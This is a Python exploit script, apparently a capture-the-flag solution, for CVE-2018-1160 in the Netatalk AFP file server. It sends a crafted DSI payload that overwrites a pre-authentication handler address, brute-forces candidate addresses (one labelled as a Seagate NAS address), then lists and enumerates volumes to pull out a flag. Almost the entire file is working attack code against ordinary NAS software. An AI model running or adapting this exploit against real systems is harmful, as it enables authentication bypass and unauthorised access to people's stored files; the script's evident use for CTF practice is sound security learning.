#!/usr/bin/env python3

import socket
import struct
import sys
import time

def send_exploit_and_check(sock, preauth_addr):
    """Send exploit with specific preauth address and check for success"""
    try:
        # Create exploit payload
        payload = b'\x00\x04\x00\x01\x00\x00\x00\x00'
        payload += b'\x00\x00\x00\x1a\x00\x00\x00\x00'
        payload += b'\x01'
        payload += b'\x18'
        payload += b'\xad\xaa\xaa\xba'
        payload += b'\xef\xbe\xad\xde'
        payload += b'\xfe\xca\x1d\xc0'
        payload += b'\xce\xfa\xed\xfe'
        payload += preauth_addr
        
        sock.sendall(payload)
        time.sleep(0.2)
        
        # Try to get server parameters (this should work if exploit succeeded)
        afp_data = struct.pack('>BBHH', 0x3f, 0x07, 0x0001, 0)
        dsi_header = struct.pack('>BBHHHH', 0x00, 0x03, 0x0001, 0, len(afp_data) + 16, 0)
        packet = dsi_header + afp_data
        sock.sendall(packet)
        
        response = sock.recv(1024)
        return response and len(response) > 16
        
    except:
        return False

def brute_force_preauth_address(host, port):
    """Brute force to find the correct preauth_switch address"""
    print(f"[+] Brute forcing preauth_switch address on {host}:{port}")
    
    # Common address patterns for x86_64
    base_addresses = [
        0x400000,  # Common base
        0x600000,  # Another common base
        0x500000,  # Alternative base
        0x63b6a0,  # Original Seagate NAS address
        0x42b660,  # Another function address
        0x42b8b0,  # afp_openvol
        0x419790,  # afp_enumerate_ext2
    ]
    
    for base in base_addresses:
        print(f"[+] Trying base address: 0x{base:x}")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            
            # Convert address to little-endian bytes
            addr_bytes = struct.pack('<Q', base)
            
            if send_exploit_and_check(sock, addr_bytes):
                print(f"[+] SUCCESS! Found working address: 0x{base:x}")
                
                # Now try to get volumes and find the flag
                print("[+] Attempting to list volumes...")
                
                # Get server parameters first
                afp_data = struct.pack('>BBHH', 0x3f, 0x07, 0x0001, 0)
                dsi_header = struct.pack('>BBHHHH', 0x00, 0x03, 0x0001, 0, len(afp_data) + 16, 0)
                packet = dsi_header + afp_data
                sock.sendall(packet)
                time.sleep(0.1)
                
                # Get volume list
                afp_data = struct.pack('>BBHH', 0x3f, 0x09, 0x0002, 0)
                dsi_header = struct.pack('>BBHHHH', 0x00, 0x03, 0x0002, 0, len(afp_data) + 16, 0)
                packet = dsi_header + afp_data
                sock.sendall(packet)
                
                vol_response = sock.recv(1024)
                if vol_response and len(vol_response) > 18:
                    num_volumes = struct.unpack('>H', vol_response[18:20])[0]
                    print(f"[+] Found {num_volumes} volumes")
                    
                    # Try to enumerate volume 1
                    if num_volumes > 0:
                        print("[+] Enumerating volume 1...")
                        afp_data = struct.pack('>BBHH', 0x3f, 0x0b, 0x0003, 0)
                        afp_data += struct.pack('>H', 1)  # Volume ID
                        afp_data += struct.pack('>H', 0)  # Directory ID
                        afp_data += struct.pack('>L', 1)  # Bitmap
                        afp_data += struct.pack('>L', 0)  # Start index
                        afp_data += struct.pack('>L', 100)  # Max items
                        afp_data += struct.pack('>L', 4096)  # Max reply size
                        afp_data += struct.pack('>L', 0)  # Search params
                        afp_data += struct.pack('>L', 0)  # Reserved
                        
                        dsi_header = struct.pack('>BBHHHH', 0x00, 0x03, 0x0003, 0, len(afp_data) + 16, 0)
                        packet = dsi_header + afp_data
                        sock.sendall(packet)
                        
                        enum_response = sock.recv(4096)
                        if enum_response:
                            print(f"[+] Enumeration response: {len(enum_response)} bytes")
                            print(f"[+] Raw data: {enum_response}")
                            
                            # Look for flag in the response
                            response_str = enum_response.decode('utf-8', errors='ignore')
                            if 'FLAG{' in response_str:
                                print(f"[+] FOUND FLAG: {response_str}")
                                return True
            
            sock.close()
            
        except Exception as e:
            print(f"[-] Error with address 0x{base:x}: {e}")
            continue
    
    return False

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 find_flag.py <host> <port>")
        print("Example: python3 find_flag.py chall.pwnable.tw 10002")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    print("CVE-2018-1160 Flag Finder")
    print("=" * 30)
    
    success = brute_force_preauth_address(host, port)
    if success:
        print("[+] Flag found!")
    else:
        print("[-] Flag not found")

if __name__ == "__main__":
    main()